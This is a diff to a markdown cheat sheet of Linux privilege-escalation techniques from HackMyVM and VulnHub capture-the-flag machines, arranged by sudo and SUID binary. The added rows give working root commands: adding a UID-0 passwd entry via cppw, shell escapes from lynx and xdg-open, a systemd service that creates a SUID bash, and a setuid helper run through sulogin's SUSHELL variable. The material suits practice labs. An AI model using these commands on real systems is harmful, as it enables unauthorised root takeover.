@@ -38,7 +38,8 @@ Table of Contents WINDOWS
 |5.|[Vulny](https://hackmyvm.eu/machines/machine.php?vm=Vulny)| [EXTERNAL Reference](https://kerszl.github.io/hacking/walkthrough/vulny/) | flock |   sudo flock -u / /bin/sh |
 |6.|[troya](https://hackmyvm.eu/machines/machine.php?vm=troya)|[Reference](https://am-a-circle.github.io/posts/troya/)| insmod | [Insert kernel as root for reverse shell](https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities#example-2-with-binary)  |
 |7.|[Echoed](https://hackmyvm.eu/machines/machine.php?vm=Echoed)|No Reference| xdg-open| 1. echo "HackMyVM.eu" > HackMyVM <br> 2. sudo -u root /usr/bin/xdg-open /tmp/HackMyVM <br> 3. Escape shell with after it comes out  e.g. <br>WARNING: terminal is not fully functional <br>/tmp/HackMyVM  (press RETURN)!/bin/sh |
-
+|8.|[Attack](https://hackmyvm.eu/machines/machine.php?vm=Attack)|No Reference| /usr/sbin/cppw| openssl passwd -1 pass123 <br> `$1$GLppQ1Z2$VsR0VveK9V3l0Ata6WLCr1` <br> kratos@attack:/home/kratos$ cp /etc/passwd . <br> kratos@attack:/home/kratos$ mv passwd passwd_backup <br> kratos@attack:/home/kratos$ echo `"user3:$1$GLppQ1Z2$VsR0VveK9V3l0Ata6WLCr1:0:0::/root:/bin/bash"` >> passwd_backup  <br> kratos@attack:/home/kratos$ sudo -u root /usr/sbin/cppw passwd_backup |
+|9.|[Talk](https://hackmyvm.eu/machines/machine.php?vm=Talk)| Reference| lynx |sudu -u root /usr/bin/lynx <br> press `shift + 1`  <br> Spawning your default shell.  Use 'exit' to return to Lynx. <br> root@talk:/home/nona# whoami;id <br> root|
  
 <a name="suid"></a>
 ##  SUID Bit [⤴](#table-of-contents)
@@ -48,6 +49,8 @@ Table of Contents WINDOWS
 |1|[ShellDredd #1 Hannah](https://www.vulnhub.com/entry/onsystem-shelldredd-1-hannah,545/)| cpulimit|[Reference](https://am-a-circle.github.io/posts/ONSYSTEM-HANNAH/)  | cpulimit -l 50 -f cp /bin/bash /tmp/bash <br> cpulimit -l 50 -f chmod +s /tmp/bash <br>  /tmp/bash -p|
 |2|[hackmyvm : connection](https://hackmyvm.eu/machines/machine.php?vm=Connection)| gdb |[Reference](https://am-a-circle.github.io/posts/connection/)  | gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit |a
 |3|[hackmyvm : soul](https://hackmyvm.eu/machines/machine.php?vm=soul)| agetty |Reference |/sbin/agetty -o -p -l /bin/bash -a root tty|
+|4|[hackmyvm :Dominator](https://hackmyvm.eu/machines/machine.php?vm=Dominator)| systemctl |Reference | hans@Dominator:$ nano /tmp/temp.service <br> hans@Dominator:$ cat /tmp/temp.service <br> [Service] <br> Type=oneshot <br> ExecStart=/bin/sh -c "cp /bin/bash /tmp/bash2 && chmod u+s /tmp/bash2" <br> [Install] <br> WantedBy=multi-user.target <br> hans@Dominator:$ /usr/bin/systemctl link /tmp/temp.service  <br> hans@Dominator:$ /usr/bin/systemctl enable --now /tmp/temp.service <br> hans@Dominator:~$ /tmp/bash2 -p <br> bash2-5.0# whoami <br> root |
+|5|[Locker](https://hackmyvm.eu/machines/machine.php?vm=Locker)| sulogin | Reference  | Environment Variables <br> sulogin looks for the environment variable SUSHELL or sushell to determine what shell to start. If the environment variable is not set, it will try to execute root's shell from /etc/passwd. If that fails it will fall back to /bin/sh. <br>  <br> ┌──(root💀kali)-[/opt/hackmyv/locker] <br> └─# cat exp.c   <br> int main() { <br> setuid(0); <br> setgid(0); <br> system("/bin/bash -p"); <br> } <br>  <br> www-data@locker:/tmp$ export SUSHELL=/tmp/exp <br> export SUSHELL=/tmp/exp <br>  <br> www-data@locker:/tmp$ chmod 777 exp <br> chmod 777 exp <br> www-data@locker:/tmp$ /usr/sbin/sulogin -e <br> /usr/sbin/sulogin -e <br> Press Enter for maintenance <br> (or press Control-D to continue): <br>  <br> root@locker:~# whoami;id <br> whoami;id <br> root <br> uid=0(root) gid=0(root) groups=0(root),33(www-data) <br> |
 
 
 
@@ -102,4 +105,7 @@ Table of Contents WINDOWS
 
 |No.| Machine Name   | service exploit  |
 |-------|-----------------|--------|
-|1. | driver | [spoolsv](https://github.com/calebstewart/CVE-2021-1675) |
+|1. | driver | [spoolsv](https://github.com/calebstewart/CVE-2021-1675) 
+
+
+
